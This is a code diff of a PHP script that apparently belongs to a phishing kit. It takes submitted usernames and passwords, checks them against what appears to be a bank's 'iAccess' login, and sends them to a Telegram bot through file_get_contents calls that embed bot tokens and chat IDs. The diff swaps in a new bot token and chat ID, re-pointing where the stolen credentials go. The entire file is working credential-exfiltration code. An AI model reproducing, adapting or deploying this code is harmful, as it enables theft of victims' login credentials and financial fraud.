@@ -7,10 +7,10 @@ $telebot = "5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs";
 
 if (strpos($result, "iAccess ID already exists")) {
 $us = [
-'chat_id' => "-731060426",
+'chat_id' => "-635799224",
 'text' => "Valid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
 ];
-file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($us));
+file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($us));
 
 $data = [
 'chat_id' => $chat_id,
@@ -53,6 +53,6 @@ $data = [
 'chat_id' => "-731060426",
 'text' => "error in checking\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
 ];
-file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($data));
+file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($data));
 header("Location: index.php?mobile");
 }
